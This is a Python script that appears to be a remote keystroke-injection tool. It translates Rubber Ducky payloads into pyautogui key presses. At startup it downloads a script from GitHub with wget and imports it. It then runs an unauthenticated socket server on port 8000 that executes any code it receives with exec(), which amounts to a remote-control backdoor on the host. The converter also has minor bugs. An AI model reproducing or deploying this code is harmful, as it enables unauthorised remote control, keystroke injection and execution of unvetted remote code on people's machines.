import socket
import time
import os
import pyautogui
p = pyautogui
a = p.alert
w = p.write
h = p.hotkey
s = time.sleep

os.system("wget https://raw.githubusercontent.com/Linoschopp/pico/main/scripts.py")
import scripts

def ducky(duckyScript):

    duckyScript = duckyScript.splitlines()
    defaultDelay = 0
    
    if duckyScript[0].startswith("DEFAULT"):
        defaultDelay = int(duckyScript[0][7:]) / 1000
        duckyScript.pop(0)
    
    previousStatement = ""
    duckyCommands = {
        "WINDOWS": "win", "GUI": "win", "APP": "optionleft", "MENU": "optionleft",
        "SHIFT": "shift", "ALT": "alt", "CONTROL": "ctrl", "CTRL": "ctrl",
        "DOWNARROW": "down", "DOWN": "down", "LEFTARROW": "left", "LEFT": "left",
        "RIGHTARROW": "right", "RIGHT": "right", "UPARROW": "up", "UP": "up",
        "BREAK": "pause", "PAUSE": "pause", "CAPSLOCK": "capslock", "DELETE": "delete",
        "END": "end", "ESC": "esc", "ESCAPE": "esc", "HOME": "home", "INSERT": "insert",
        "NUMLOCK": "numlock", "PAGEUP": "pageup", "PAGEDOWN": "pagedown",
        "PRINTSCREEN": "printscreen", "SCROLLLOCK": "scrolllock", "SPACE": "space",
        "TAB": "tab", "ENTER": "enter", "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
        "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8", "F9": "f9", "F10": "f10",
        "F11": "f11", "F12": "f12", "a": "A", "b": "B", "c": "C", "d": "D", "e": "E",
        "f": "F", "g": "G", "h": "H", "i": "I", "j": "J", "k": "K", "l": "L", "m": "M",
        "n": "N", "o": "O", "p": "P", "q": "Q", "r": "R", "s": "S", "t": "T", "u": "U",
        "v": "V", "w": "W", "x": "X", "y": "Y", "z": "Z", "A": "A", "B": "B", "C": "C",
        "D": "D", "E": "E", "F": "F", "G": "G", "H": "H", "I": "I", "J": "J", "K": "K",
        "L": "L", "M": "M", "N": "N", "O": "O", "P": "P", "Q": "Q", "R": "R", "S": "S",
        "T": "T", "U": "U", "V": "V", "W": "W", "X": "X", "Y": "Y", "Z": "Z", "1": "1",
        "2": "2", "3": "3", "4": "4", "5": "5", "6": "6", "7": "7", "8": "8", "9": "9",
        "0": "0", "!": "!", "\"": "\"", "#": "#", "$": "$", "%": "%", "&": "&", "'": "'",
        "(": "(", ")": ")", "*": "*", "+": "+", ",": ",", "-": "-", ".": ".", "/": "/",
        ":": ":", ";": ";", "<": "<", "=": "=", ">": ">", "?": "?", "@": "@", "[": "[",
        "]": "]", "^": "^", "_": "_", "`": "`", "{": "{", "|": "|", "}": "}", "~": "~"
    }
    
    pythonScript = ""
    
    for line in duckyScript:
        if line.startswith("REM"):
            previousStatement = line.replace("REM", "#")
        elif line.startswith("DELAY"):
            previousStatement = f"time.sleep({float(line[6:]) / 1000})"
        elif line.startswith("STRING"):
            previousStatement = f"pyautogui.typewrite(\"{line[7:]}\", interval=0.02)"
        elif line.startswith("REPEAT"):
            repetitions = int(line[7:]) - 1
            for _ in range(repetitions):
                pythonScript += previousStatement + "\n"
                if defaultDelay != 0:
                    pythonScript += f"time.sleep({defaultDelay})\n"
        else:
            previousStatement = "pyautogui.hotkey("
            keys = line.split(" ")
            for key in keys:
                if key in duckyCommands:
                    previousStatement += f"\"{duckyCommands[key]}\","
                else:
                    previousStatement += "UNDEFINED_KEY,"
            previousStatement = previousStatement[:-1] + ")"
        pythonScript += previousStatement + "\n"
        if defaultDelay != 0:
            pythonScript += f"time.sleep({defaultDelay})\n"
    return pythonScript


IP = socket.gethostbyname(socket.gethostname()+".local")
PORT = 8000
ADDR = (IP, PORT)


def run_server():
  def c():
    nonlocal connected
    nonlocal conn
    nonlocal server
    connected = False
    conn.close()
    server.close()

  def sc():
    global hosting
    nonlocal connected
    nonlocal conn
    nonlocal server
    connected = False
    conn.close()
    server.close()
    hosting = False

  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server.bind(ADDR)
  print(f"Running on {IP}:{PORT}")
  server.listen(1)
  print("Listening for connections...")
  conn, addr = server.accept()
  print(f"Verbunden mit {addr}")
  connected = True
  while connected:
    command = conn.recv(1024).decode("utf-8")
    if command.startswith("DUCKY"):
        command = ducky(command[6:])
    try:
        exec(command)
    except Exception as e:
        print(f"Fehler beim Ausführen des Befehls: {e}")


if __name__ == "__main__":
    hosting = True
    while hosting:
        run_server()
        s(2)  # Optional: Wartezeit vor erneuter Verbindung
